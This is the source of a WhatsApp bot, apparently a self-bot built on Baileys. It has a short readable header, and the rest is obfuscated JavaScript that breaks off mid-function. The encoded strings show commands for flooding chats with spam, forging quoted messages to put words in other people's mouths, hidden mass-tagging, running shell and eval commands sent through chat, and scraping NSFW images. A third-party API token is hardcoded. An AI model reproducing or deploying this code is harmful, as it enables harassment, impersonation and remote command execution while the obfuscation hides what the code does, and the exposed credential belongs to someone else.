// das créditos puta

//npm
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const util = require('util')
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

//json file
const _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const afk = JSON.parse(fs.readFileSync('./database/off.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))

//Config
const { covidindo } = require("./config/covidindo.js")const _0x2d5a=['Sargento\x20II','https://nekos.life/api/v2/img/boobs','\x0a*Mana*\x20:\x20','https://nekos.life/api/v2/img/nsfw_avatar','covidindo*\x0a├\x20*','\x0a├\x20*Rol*:\x20','ping*\x0a├\x20*','fitnahpc','Bueno,\x20falló,\x20inténtalo\x20de\x20nuevo\x20^_^','.webp','shift','ytmp4\x20[linkYt]*','image/jpeg','start','Penggunaan\x20','https://nekos.life/api/v2/img/holoero','https://nekos.life/api/v2/img/feetg','anime*\x20[\x20random\x20]\x0a├\x20*','43lueZcf','cum','./stik/fake.jpeg','\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=15\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20','\x20Second*','https://','Responde\x20video\x20UnU📸!','wenas🌚','.jpg','settarget*\x0a├\x20*','runtime','*[██████████]\x20','off','setprefix*\x0a├\x20*','message','Error\x20:\x20','*YTMP\x204!*\x0a\x0a*Title*\x20:\x20','remoteJid','participant','Master\x20sgt\x20II','stikerwm','./lib/fetcher.js','.mp4','Ingrese\x20texto!','ytmp3*\x20[\x20link\x20]\x20\x0a├\x20*','\x20[Fragment]\x0a*Rilis*\x20:\x20','pesoff*\x0a├\x20*','add','revip','giftag.gif','endsWith','imageMessage','memoryUsage','herolist','eroyuri','Casos\x20:\x20','boobs','\x0a│\x0a└─\x20❏\x20Numero:\x20','solo\x20pegatinas','*Hero\x20details\x20','Ahhh\x20pwrdon\x20T-T\x20no\x20pude','responde\x20a\x20un\x20video\x20imagen\x20o\x20sticker\x20con\x20:\x20','❏\x20Link:\x20','image*\x20[\x20random\x20]\x0a├\x20*','BOT','HH:mm:ss','promote*\x20[\x20tag\x20member\x20]\x0a├\x20*','result','❏\x20Title:\x20','tourl','image/gif','Reply\x20Document\x20dengan\x20caption\x20*','Asia/Jakarta','hero','avatar','brainly-scraper','Ingrese\x20el\x20enlace\x20del\x20grupo','./database/off.json','test','\x0a-\x20*Velocidad\x20:*\x20','\x0a*Username*\x20:\x20','\x0a◪\x20Bienvenido\x20UwU\x20a\x0a├─\x20','\x20[DM]\x20|\x20','tovideo','groupMakeAdmin','hidetag','video/gif','base64','\x20conversación','\x0a-\x20*Total\x20de\x20chat\x20:*\x20','link','json','holoero','feed','https://nekos.life/api/v2/img/les','Finish','1610993486','\x0a\x0aHelado\x20:\x20','./config/herodetail.js','url_list','whatsapp.com','Especialmente\x20hermano,\x20¿quién\x20eres??','audio','contextInfo','Error\x207-7..','VERSION:3.0\x0a','END:VCARD','play','swm\x20teks|teks\x20atau\x20tag\x20gambar\x20yang\x20sudah\x20dikirim','covidindo','downloadMediaMessage','phone','doc.txt','setfake','2nd\x20Lt\x20II','nsfwavatar*\x20\x0a├\x20*','https://nekos.life/api/v2/img/pwankg','Que\x20buscare?\x20O.O','tiktok*\x20[\x20link\x20]\x20\x0a├\x20*','api','\x0a*Fitur\x20Hero*\x20:\x20','tickle','\x0a\x0a_Untuk\x20durasi\x20lebih\x20dari\x20batas\x20disajikan\x20dalam\x20mektuk\x20link_','join','fitnah\x20[@tag|pesan|balasanbot]]\x0a\x0aEx\x20:\x20\x0a','133351WuJIaN','pussy','-vcodec','\x20Scan\x20the\x20qr\x20code\x20above','diamond','Succes\x20Mengganti\x20Prefix\x20:\x20','term*\x20[\x20code\x20]\x0a├\x20*','vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=','audioMessage','\x20Apagado\x20UvU\x20','term','./database/welkom.json','pwankg','settarget\x20503xxxxx','\x20」\x0aGrupo\x20oficial\x20:\x20https://chat.whatsapp.com/J72bXsh3gRxKufBl8iikDO\x0a╭─Comandos\x20UwU\x20\x0a├\x20*','subject','stringify','getNumber','\x0a\x0a*➸\x20Respuesta:*\x20','status*\x0a├\x20*','\x20-O\x20','swm*\x20[\x20author|packname\x20]\x0a├\x20*','end','wrongFormat','\x0aLintang\x20:\x20','tourl*\x20[\x20image\x20>\x20url]\x0a├\x20*','\x0a*Verified*\x20:\x20','random','DONE','SATANCITO\x20ᵈᵃʳʸ⛥','Solo\x20mi\x20dueño\x20satan\x20UnU','https://nekos.life/api/v2/img/goose','video','0@s.whatsapp.net','hex','Sargento\x20IV','[\x20\x1b[1;36mEXECC\x1b[1;37m\x20]','\x0a*Following*\x20:\x20','\x0a*Quotes*\x20:\x20','Aun\x20noob','fitnahpc\x20teks\x20target|teks\x20lu','CB:action,,call','@adiwajshing/baileys','herodetail','No\x20eres\x20mi\x20dueño\x20UnU...','twitter*\x20[\x20link\x20]\x20\x0a├\x20*','lewd','Connecting...','Error!','images','self','\x20-filter_complex\x20\x22[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]\x22\x20-map\x20\x22[v]\x22\x20-map\x20\x22[a]\x22\x20','https://nekos.life/api/v2/img/hentai','succes\x20delete\x20chat\x20=\x20','\x20&&\x20ffmpeg\x20-i\x20','exif','then','\x0a\x0a_Ten\x20paciencia,\x20estoy\x20enviando\x20el\x20archivo\x20T~T_','ping','./config/covidworld.js','download','totag','Error\x20:\x20%s','2nd\x20Lt\x20IV','infogempa','\x0a\x0a_Silahkan\x20tunggu\x20file\x20media\x20sedang\x20dikirim\x20mungkin\x20butuh\x20beberapa\x20menit_','toFixed','ago','https://nekos.life/api/v2/img/neko','tovid*\x20[\x20sticker\x20>\x20video]\x0a├\x20*','g-i-s','gif','loli','jid','unlinkSync','setthumb','head','generateLinkPreview','Sukses\x20Up\x20story\x20wea\x20teks\x20','tiktokaudio*\x20[\x20link\x20]\x20\x0a├\x20*','\x0a>Broadcast','vname','ssstik','656957TUkzWs','groupRemove','covidworld*\x0a├\x20*','Sargento','\x0a-\x20*Chats\x20:*\x20','physical_attack','sticktag*\x20[\x20sticker\x20>\x20tag\x20]\x0a├\x20*','Reponde\x20video\x20UnU\x20📸','skill','setfakeimg*\x0a├\x20*','delete*\x0a├\x20*','sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=','action','\x20-vf\x20reverse\x20-af\x20areverse\x20','El\x20texto?\x20._.','ytmp4','https://nekos.life/api/v2/img/pat','video/mp4','title','\x20kamu\x20jadi\x20admin!','\x20Jam,\x20','close','BEGIN:VCARD\x0aVERSION:3.0\x0aN:XL;','\x20⊱\x20','messages','\x0a*Skill\x20Effect*\x20:\x20','https://nekos.life/api/v2/img/anal','ytsearch*\x20[\x20query\x20]\x20\x0a├\x20*','length','trim','awesome-phonenumber','fb*\x20[\x20link\x20]\x20\x0a├\x20*','https://tinyurl.com/api-create.php?url=','map','profile_pic_url_hd','◩\x20*SATANCITO\x20ᵈᵃʳʸ⛥*','Holi\x20cosita\x20UwU\x20','upswimage','❏\x20Subida:\x20','Sukses\x20Upload\x20Story\x20Video\x20dengan\x20Caption:\x20','on*\x0a├\x20*','https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt','includes','mp4Audio','\x0a*Full\x20Name*\x20:\x20','get*\x20[\x20google.com\x20]\x0a├\x20*','Lito','Etto\x20UvU','\x0a*Ext*\x20:\x20MP3\x0a*Size*\x20:\x20','kirim/reply\x20image\x20dengan\x20capion\x20','hours','ytmp3','https://nekos.life/api/v2/img/kiss','Utilice\x20el\x20código\x20de\x20país','*PLAY\x20MUSIC*\x0a\x0a*Title*\x20:\x20','*List\x20hero\x20untuk\x20feature\x20','screenshot','participants','pow','peson','giftag','status@broadcast','28777','loadAuthInfo','Pwro','emoji','audio/mp4','inputFormat','>\x20ONLINE','yuri','Badmin','\x0a\x0a└─\x20❏\x20Numero:\x20','toimg','herodetail*\x20[\x20Barats\x20]\x0a├\x20*','*[██▒▒▒▒▒▒▒▒]\x20','skill_effects','giftag*\x20[\x20gif\x20>\x20tag\x20]\x0a├\x20*','documentMessage','user','◪\x20chao\x20','./database/user.json','*Archivo\x20encontrado!*\x0a\x0a*Title*\x20:\x20','mana_regen','BEGIN:VCARD\x0a','kick','>\x20[\x20INGFO\x20]','*[█████████▒]\x20','sticker\x0aDuracion\x20del\x20video\x20de\x201-9\x20segundos','mentionedJid','text','menu','demote*\x20[\x20tag\x20admin\x20]\x0a├\x20*','.png','https://chat.whatsapp.com/','extendedTextMessage',',;;;\x0aFN:','Pwrdon...\x20T_T','pinterest','\x0a*Mana\x20Regen*\x20:\x20','spam\x20teks|jumlah','scale=\x27min(320,iw)\x27:min\x27(320,ih)\x27:force_original_aspect_ratio=decrease,fps=15,\x20pad=320:320:-1:-1:color=white@0.0,\x20split\x20[a][b];\x20[a]\x20palettegen=reserve_transparent=on:transparency_color=ffffff\x20[p];\x20[b][p]\x20paletteuse','ability_crit_rate','\x0a-\x20Prefix\x20:\x20「\x20','1PUWPqu','./lib/fetcher','existsSync','Teniente\x20II','pesoff','base64EncodedAuthInfo','goose','https://nekos.life/api/v2/img/lewd','key','.gif','deleteMessage','modifyChat','Formato\x20incorrecto,\x20intenta\x20denuevo\x20UwU','role','minutes','toLowerCase','chat-update','doctag','speed*\x0a╰─\x20SATANCITO\x20ᵈᵃʳʸ⛥\x20\x0a√Eli.Hopeˢᵃᵗᵃⁿ💞\x0a√Satancitoᵈᵃʳʸ💞\x0a√Daricitaˢᵃᵗᵃⁿ💖\x0a√Mr.Patitoᵉᵛᵒˡᵉᵗ🦆\x0a√Felixcitoᵇʳⁱ🌚\x0a','quotedMessage','battle_point','\x0aPor\x20puto\x20Ojala\x20no\x20vuelva\x20UnU~~','\x20ke\x20stiker','google','Gagal,\x20pada\x20saat\x20mengkonversi\x20','「\x20*PUBLICO\x20OwO*\x20」','data','sticker','https://nekos.life/api/v2/img/blowjob','\x0a├\x20*Número*\x20:\x20wa.me/','https://shot.screenshotapi.net/screenshot?token=D2TDY3F-G5YMM94-K9JEQT8-FYBDQBB&url=','\x20[Battle\x20point]\x20|\x20','seconds','ephemeralMessage','❉───────────────────────❉\x0a','Etto.UvU','@s.whatsapp.net','open','createWriteStream','canonicalUrl','\x0a*HP*\x20:\x20','cnn','only','+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=','jpegThumbnail','No\x20soy\x20una\x20admin\x20T-T','Usernamenya?','http://api.lolhuman.xyz/api/welcomeimage?apikey=','runtime*\x0a├\x20*','done','videoMessage','igstalk','groupAdd','https://nekos.life/api/v2/img/bj','kontak','\x0a\x0aReponerse\x20:\x20','wenas👋','Error\x207-7.','1003489JhCWog','https://nekos.life/api/v2/img/pussy_jpg','666.webp','fetchUser','selesai','pinterest*\x20[\x20random\x20]\x0a├\x20*','https://nekos.life/api/v2/img/tickle','1162802oicNkw','\x1b[1;37m>','Ok\x20brother','pussyimage','fitnah\x20@tagmember|Hola|Hola\x20juga','Perdon...\x20T-T','erokemo','kontag*\x20[\x20687xx|aku\x20>\x20tag\x20]\x0a├\x20*','uptime','log','image','followers','*[▒▒▒▒▒▒▒▒▒▒]\x200%*','level','https://nekos.life/api/v2/img/hololewd','*[███▒▒▒▒▒▒▒]\x20','messageID','https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60','reponde\x20video\x20UnU!','solog','toimg*\x20[\x20sticker\x20>\x20image\x20]\x0a├\x20*','Self\x20Bot','herolist*\x0a├\x20*','tiktokaudio','round','c.us','jawaban','request','\x0a├\x20Número\x20:\x20wa.me/','cumimage','1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==','ffmpeg\x20-i\x20','replace','\x0aWilayah\x20:\x20','description','take*\x20[\x20author|packname\x20]\x0a├\x20*','reverse*\x20[\x20video\x20>\x20reverse\x20]\x0a├\x20*','Ok\x20@','339538SsCPDe','https://nekos.life/api/v2/img/avatar','libwebp','\x20Menit,\x20','group','addOutputOptions','Hola\x20','quotedM','util','https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc','content-type','facebook.com','undefined','Responde\x20video\x20o\x20imagen\x20nwn','blue','&safe=strict&sxsrf=ALeKk03WtBNqunvK303Qm3aEToejzpQvag%3A1621384426733&source=hp&ei=6lykYJbUKtPmz7sP-MugmAU&oq=p&gs_lcp=ChFtb2JpbGUtZ3dzLXdpei1ocBADMgQIIxAnMgQIIxAnMgQIIxAnMggIABCxAxCDATIFCAAQsQMyBQguELEDMggIABCxAxCDATIICAAQsQMQgwE6BwgjEOoCECdQlg9Ylg9g9hJoAXAAeACAAVmIAVmSAQExmAEAoAEBsAEP&sclient=mobile-gws-wiz-hp&full_page=true&fresh=true&output=json&file_type=png&wait_for_event=load','startsWith','entrance_quotes','version','TEL;type=CELL;type=VOICE;waid=','off*\x0a├\x20*','instagram.com','\x0a*Offence*\x20:\x20','mute','get','\x0a├\x20XP\x20:\x20\x20','tiktokaudio*\x20[\x20query\x20]\x20\x0a├\x20*','play*\x20_Judul\x20lagu\x20yang\x20akan\x20dicari_','wget\x20','offense','hentai','Err:\x20','self*\x0a├\x20*','demote','❏\x20Duracion:\x20','blockUser','s.whatsapp.net','FN:','remove','waifu','2411342MixlLv','tiktok-scraper-without-watermark','\x0a├\x20\x20*Xp*\x20:\x20','forEach','unmute','attp','\x0aLee\x20las\x20reglas\x20y\x20comportate\x20y\x20no\x20spam\x20con\x20el\x20bot,\x20gracias\x20UvU\x0a','*\x0a-\x20*Celular\x20:*\x20','\x0a*Magic\x20Defense*\x20:\x20','Intenta\x20de\x20nuevo','status','all','slice','anime','floor','emoji-api','spam','./stik/thumb.jpeg','50373488366','Reponde\x20video\x20UnU','loli*\x0a├\x20*','swm','Error\x20:','ytmp4*\x20[\x20link\x20]\x20\x0a├\x20*','*[███████▒▒▒]\x20','hentai*\x20\x0a├\x20*','\x20kamu\x20gak\x20admin\x20lagi\x20yaa!','6289523258649-1604595598@g.us','./stik/data.exif','fromCharCode','judul','from','\x0a*Durability*\x20:\x20','Hay\x20un\x20error','unmute*\x0a├\x20*','twitter-url-direct','*Chats\x20borrados\x207n7*','waifu*\x0a├\x20*','*[████████▒▒]\x20','./lib/functions','getProfilePicture','Asalto','got','https://api.xteam.xyz/attp?file&text=','MB\x20/\x20','g.us','toggleDisappearingMessages','contacts','Lito\x20UwU','setfakeimg','\x20-vcodec\x20libwebp\x20-filter:v\x20fps=fps=20\x20-lossless\x201\x20-loop\x200\x20-preset\x20default\x20-an\x20-vsync\x200\x20-s\x20512:512\x20','-set','name','Hecho\x20mi\x20amo\x207~7','Kirim\x20perintah\x20*','https://nekos.life/api/v2/img/pussy','2nd\x20Lt\x20I','match','peson*\x0a├\x20*','\x20Sedang\x20Offline!\x0a\x0a\x20*Alasan\x20:*\x20','┌──⫶\x20*Nivel*\x20⫶──\x0a├\x20*Nombre*\x20:\x20','No\x20eres\x20mi\x20dueño\x20UnU?','-vf','setreply','warn','conversation','Kirim\x20gambar\x20dengan\x20caption\x20','fast','brainly*\x20[\x20query\x20]\x20\x0a├\x20*','fast*\x20[\x20video\x20>\x20fast\x20]\x0a├\x20*','release_date','pat','*[████▒▒▒▒▒▒]\x20','\x0a\x0aTitle\x20:\x20','public*\x0a├\x20*','Connected','tiktok.com','twitter.com','webpmux','catch','succes\x20unmute\x20chat\x20=\x20','herodetail*\x0a\x0a','tiktok','stickerwm','succes\x20mute\x20chat\x20=\x20','Pwro..','Holi\x20cosita\x20^-^','feetg','>\x20OFFLINE','nsfwavatar','spam*\x0a├\x20*','caption','1FfKTDN','difficulty','laning_recommendation','NIH','Ggt\x201st\x20class\x20IV','hasNewMessage','slow*\x20[\x20video\x20>\x20slow\x20]\x0a├\x20*','1Wpgeno','\x0a*Sejak\x20:*\x20','push','moment-timezone','spam\x20teks|jumlahspam','https://api.fdci.se/rep.php?gambar=husbu','DD/MM\x20HH:mm:ss','chats','\x0a\x0a*Link*\x20:\x20https://instagram.com/','「\x20*Privado\x20UwU*\x20」','https://nekos.life/api/v2/img/feed','public','*PLAY\x20VIDEO*\x0a\x0a*Title*\x20:\x20','Domain/Ip\x20nya\x20mana\x20bang??','&text=','acceptInvite','trap','sendMessage','wait','fdeface*\x0a├\x20*','parse','format','downloadAndSaveMediaMessage','https://nekos.life/api/v2/img/tits','tomp3','price','writeFileSync','brainly','toString','Sgt\x201st\x20class\x20III','./database/level.json','reverse','Succes\x20Mengganti\x20target\x20fitnahpc\x20:\x20','movement_speed','toFormat','\x0a*Story*\x20:\x20','upswimage*\x0a├\x20*','wallpaperanime*\x0a├\x20*','performance-now','https://nekos.life/api/v2/img/nsfw_neko_gif','kontak*\x20[\x20628xx|aku\x20]\x0a├\x20*','attributes','totalmem','split','WEA','sticker*\x20[\x20image\x20>\x20sticker]\x0a├\x20*','「\x20*YOUTUBE\x20SEARCH*\x20」','neofetch\x20--stdout','browser-id3-writer','Responde\x20a\x20un\x20sticker!','save','Solo\x20los\x20admins\x20UvU','mana','\x0a\x0a_Para\x20duraciones\x20superiores\x20al\x20límite\x20se\x20presentan\x20en\x20el\x20enlace_','timestamp','nekopoi*\x20\x20\x0a├\x20*','this.isZero','Degradar\x20con\x20éxito\x20UnU\x0a','thumb','Promovido\x20Mi\x20niñ@\x20lind@\x20UwU\x0a','\x0a└\x20\x20*Nivel*\x20:\x20','pato@self:~$\x20','Waktu\x20:\x20','\x0a-\x20\x20*Grupos\x20:*\x20','now','Link?','keys','./lib/color','nekopoi','byee..\x20@','\x0a________________________\x0a\x0a','\x0a*Ext*\x20:\x20MP4\x0a*Size*\x20:\x20','./lib/ytdl','2nd\x20Lt\x20III',';(async\x20()\x20=>\x20{\x20','totag*\x20[\x20media\x20>\x20tag\x20]\x0a├\x20*','red','https://nekos.life/api/v2/img/futanari','welcome\x201/0*\x0a├\x20*','Speed:\x20','qrcode-terminal','link\x20:3?','Reply\x20Gif\x20nya\x20dengan\x20caption\x20','*[█▒▒▒▒▒▒▒▒▒]\x20','Usage\x20:\x0a','Soldado','readFileSync','\x20Second\x0a-\x20*Mi\x20tiempo\x20vivo:*\x20','Enviar\x20pedido\x20*','Oke\x20@','@g.us','*Muteados\x20putos\x20ÙwÚ*','connecting','twitter','tomp3*\x20[\x20sticker\x20>\x20mp3]\x0a├\x20*','fluent-ffmpeg','\x0aLink\x20:\x20','No\x20eres\x20mi\x20dueño\x20UnU','Auto\x20block\x20system,\x20don\x27t\x20call\x20please','https://nekos.life/api/v2/img/lewdkemo','\x20})()','LINK\x20ERROR!','slow','ero','Ten\x20paciencia\x20soy\x20lenta\x20TwY','exit','sticktag','\x0a*Ability\x20Crit\x20Rate*\x20:\x20','&img=','*\x0a*Nama*\x20:\x20','input','url','pipe','oppai','anal','*STATUS*\x0a','Invalid\x20domain/ip','ig*\x20[\x20link\x20]\x20\x0a├\x20*','https://nekos.life/api/v2/img/cum','\x0a*Ext*\x20:\x20MP3\x0a*Filesize*\x20:\x20','Master\x20sgt\x20V','\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD','wallpaperanime','Started\x20:\x20','sethumb','./lib/offline','tovid','keta','>\x20[\x20JAPRI\x20]','video*\x20_Judul\x20lagu\x20yang\x20akan\x20dicari_','lo\x20siento\x20hermano:(','*ID*\x20:\x20','\x20-filter_complex\x20\x22[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]\x22\x20-map\x20\x22[v]\x22\x20-map\x20\x22[a]\x22\x20','kuni','Sukses\x20Upload\x20Story\x20Image\x20dengan\x20Caption:\x20','Message','./lib/webp2mp4','futanari','getInfo','50373488366@s.whatsapp.net','webp','error','stickerMessage','https://nekos.life/api/v2/img/erokemo','notify','upswteks*\x0a├\x20*','admin','19793BoXsHR','Anuncio\x20con\x20errores\x20de\x20nuevo\x20intente..','./session.json','covidworld','hero_name','https://nekos.life/api/v2/img/eron','groupMetadata','\x1b[1;36mEVALL\x1b[1;37m','husbu*\x0a├\x20*','parse-ms','aqua','femdom','./config/cnn.js','desc','fromMe','narutod','heapUsed','white','delete','Yang\x20mau\x20di\x20cari\x20afa?','\x0a*Followers*\x20:\x20','doctag*\x20[\x20document\x20>\x20tag\x20]\x0a├\x20*','Sargento\x20III','\x0a\x0a*Link*\x20:\x20','https://nekos.life/api/v2/img/kuni','Tag\x20yg\x20ingin\x20angda\x20tusbol!','\x0a*Link*\x20:\x20','\x0a❉──────────────────❉\x0a','\x20Detik\x20lalu\x0a\x0aSilahkan\x20Hubungi\x20Lagi\x20Nanti','./stik','upswteks','ytmp3\x20[linkYt]*','hero_fragment','*OFFLINE*','de\x20nuevo\x20genial?\x20qué\x20estás\x20buscando?'];function _0x2de2(_0xcec156,_0x16e8c8){_0xcec156=_0xcec156-0x194;let _0x2d5a94=_0x2d5a[_0xcec156];return _0x2d5a94;}const _0x541342=_0x2de2;(function(_0x481c47,_0x2ece0e){const _0x5e5021=_0x2de2;while(!![]){try{const _0x5712f8=-parseInt(_0x5e5021(0x1c4))+parseInt(_0x5e5021(0x1f1))*parseInt(_0x5e5021(0x275))+-parseInt(_0x5e5021(0x344))*-parseInt(_0x5e5021(0x30f))+-parseInt(_0x5e5021(0x1cb))+-parseInt(_0x5e5021(0x3ad))+-parseInt(_0x5e5021(0x400))*parseInt(_0x5e5021(0x27c))+parseInt(_0x5e5021(0x219))*parseInt(_0x5e5021(0x467));if(_0x5712f8===_0x2ece0e)break;else _0x481c47['push'](_0x481c47['shift']());}catch(_0x490cc3){_0x481c47['push'](_0x481c47['shift']());}}}(_0x2d5a,0x9d904));const qrcode=require(_0x541342(0x2cc)),moment=require(_0x541342(0x27f)),speed=require(_0x541342(0x2a2)),request=require(_0x541342(0x1e6)),{spawn,exec,execSync}=require('child_process'),fs=require('fs'),axios=require('axios'),ffmpeg=require(_0x541342(0x2db)),{EmojiAPI}=require(_0x541342(0x228)),tik=require(_0x541342(0x21a)),ig=require('insta-fetcher'),emoji=new EmojiAPI(),fetch=require('node-fetch'),Fb=require('fb-video-downloader'),twitterGetUrl=require(_0x541342(0x23c)),phoneNum=require(_0x541342(0x41e)),gis=require(_0x541342(0x3f3)),got=require(_0x541342(0x243)),imageToBase64=require('image-to-base64'),ID3Writer=require(_0x541342(0x2ac)),brainly=require(_0x541342(0x37b)),yts=require('yt-search'),ms=require(_0x541342(0x318)),toMs=require('ms'),{error}=require(_0x541342(0x2cc)),util=require(_0x541342(0x1f9)),{getBuffer,h2k,generateMessageID,getGroupAdmins,getRandom,banner,start,info,success,close}=require(_0x541342(0x240)),{color,bgcolor}=require(_0x541342(0x2bf)),{fetchJson,getBase64,kyun,createExif}=require(_0x541342(0x468)),{yta,ytv,igdl,upload}=require(_0x541342(0x2c4)),{webp2mp4File}=require(_0x541342(0x304)),{sleep,isAfk,cekafk,addafk}=require(_0x541342(0x2f9)),time=moment()['tz'](_0x541342(0x378))[_0x541342(0x291)](_0x541342(0x371)),_leveling=JSON[_0x541342(0x290)](fs[_0x541342(0x2d2)]('./database/leveling.json')),_level=JSON[_0x541342(0x290)](fs[_0x541342(0x2d2)](_0x541342(0x29a))),afk=JSON[_0x541342(0x290)](fs['readFileSync'](_0x541342(0x37d))),welkom=JSON[_0x541342(0x290)](fs['readFileSync'](_0x541342(0x3b8))),{covidindo}=require('./config/covidindo.js'),{covidworld}=require(_0x541342(0x3e8)),{cnn}=require(_0x541342(0x31b)),{Gempa}=require('./config/gempa.js'),{herolist}=require('./config/herolist.js'),{herodetails}=require(_0x541342(0x392)),{WAConnection,MessageType,Presence,MessageOptions,Mimetype,WALocationMessage,WA_MESSAGE_STUB_TYPES,WA_DEFAULT_EPHEMERAL,ReconnectMode,ProxyAgent,GroupSettingChange,ChatModification,waChatKey,mentionedJid,processTime}=require(_0x541342(0x3d7));prefix='.',hit_today=[],blocked=[],banChats=![],offline=![],targetpc=_0x541342(0x22b),owner=_0x541342(0x22b),fake=_0x541342(0x3ca),numbernye='0',waktu='-',alasan='-';async function starts(){const _0x45c3a1=_0x541342,_0x138c14=new WAConnection();_0x138c14[_0x45c3a1(0x203)]=[0x2,0x847,0x6],_0x138c14['logger'][_0x45c3a1(0x1d8)]=_0x45c3a1(0x259),console[_0x45c3a1(0x1d4)]('>','[',color('INGFO',_0x45c3a1(0x1ff)),']','Menglogin\x20kawan...'),_0x138c14['on']('qr',()=>{const _0x5e81b2=_0x45c3a1;console[_0x5e81b2(0x1d4)](color('[',_0x5e81b2(0x320)),color('!',_0x5e81b2(0x2c8)),color(']',_0x5e81b2(0x320)),color(_0x5e81b2(0x3b0)));}),fs[_0x45c3a1(0x469)]('./session.json')&&_0x138c14[_0x45c3a1(0x43f)]('./session.json'),_0x138c14['on'](_0x45c3a1(0x2d8),()=>{const _0x1cca74=_0x45c3a1;console[_0x1cca74(0x1d4)](color(_0x1cca74(0x455),_0x1cca74(0x320)),color(_0x1cca74(0x3dc)));}),_0x138c14['on'](_0x45c3a1(0x1af),()=>{const _0x379ce0=_0x45c3a1;console[_0x379ce0(0x1d4)](color('>\x20[\x20INGFO\x20]','white'),color(_0x379ce0(0x264)));}),await _0x138c14['connect']({'timeoutMs':0x1e*0x3e8}),fs['writeFileSync'](_0x45c3a1(0x311),JSON[_0x45c3a1(0x3bd)](_0x138c14[_0x45c3a1(0x46c)](),null,'\x09')),_0x138c14['on'](_0x45c3a1(0x3d6),async _0x55e329=>{const _0x4a8c06=_0x45c3a1,_0x480269=_0x55e329[0x2][0x0][0x1][_0x4a8c06(0x238)];console[_0x4a8c06(0x1d4)]('call\x20dari\x20'+_0x480269),_0x138c14['sendMessage'](_0x480269,_0x4a8c06(0x2de),MessageType['text']),await sleep(0xfa0),await _0x138c14[_0x4a8c06(0x214)](_0x480269,_0x4a8c06(0x35f));}),_0x138c14['on']('group-participants-update',async _0x242cf6=>{const _0x172d61=_0x45c3a1;if(!welkom[_0x172d61(0x42a)](_0x242cf6[_0x172d61(0x3f6)]))return;try{num=_0x242cf6[_0x172d61(0x439)][0x0];const _0x3d5fc6=await _0x138c14[_0x172d61(0x315)](_0x242cf6[_0x172d61(0x3f6)]);try{var _0x39e7a7=await _0x138c14[_0x172d61(0x241)](num);}catch(_0x2fa723){var _0x39e7a7=_0x172d61(0x1dc);}_0x242cf6[_0x172d61(0x40c)]=='add'&&(ini_user=_0x138c14['contacts'][num],ini_img=await getBuffer(_0x172d61(0x1b9)+LolHuman+_0x172d61(0x2e8)+_0x39e7a7+_0x172d61(0x28a)+ini_user[_0x172d61(0x30c)]),group_info=await _0x138c14[_0x172d61(0x315)](_0x242cf6[_0x172d61(0x3f6)]),welkam=_0x172d61(0x1f7)+ini_user[_0x172d61(0x30c)]+_0x172d61(0x381)+_0x3d5fc6['subject']+_0x172d61(0x447)+num[_0x172d61(0x1eb)](_0x172d61(0x1ae),'')+_0x172d61(0x21f)+ini_user[_0x172d61(0x30c)],_0x138c14[_0x172d61(0x28d)](_0x242cf6[_0x172d61(0x3f6)],ini_img,MessageType[_0x172d61(0x1d5)],{'caption':welkam})),_0x242cf6[_0x172d61(0x40c)]==_0x172d61(0x217)&&(ini_user=_0x138c14[_0x172d61(0x248)][num],ini_img=await getBuffer('http://api.lolhuman.xyz/api/welcomeimage?apikey='+LolHuman+_0x172d61(0x2e8)+_0x39e7a7+_0x172d61(0x28a)+ini_user[_0x172d61(0x30c)]),out=_0x172d61(0x44f)+ini_user[_0x172d61(0x30c)]+'\x0a◪\x20se\x20fue\x20de:\x0a'+_0x3d5fc6[_0x172d61(0x3bc)]+_0x172d61(0x369)+num[_0x172d61(0x1eb)]('@s.whatsapp.net','')+_0x172d61(0x19f),_0x138c14[_0x172d61(0x28d)](_0x242cf6[_0x172d61(0x3f6)],ini_img,MessageType[_0x172d61(0x1d5)],{'caption':out}));}catch(_0x3b292e){console[_0x172d61(0x1d4)]('Error\x20:\x20%s',color(_0x3b292e,_0x172d61(0x2c8)));}}),_0x138c14['on'](_0x45c3a1(0x19a),async _0x15b2ca=>{const 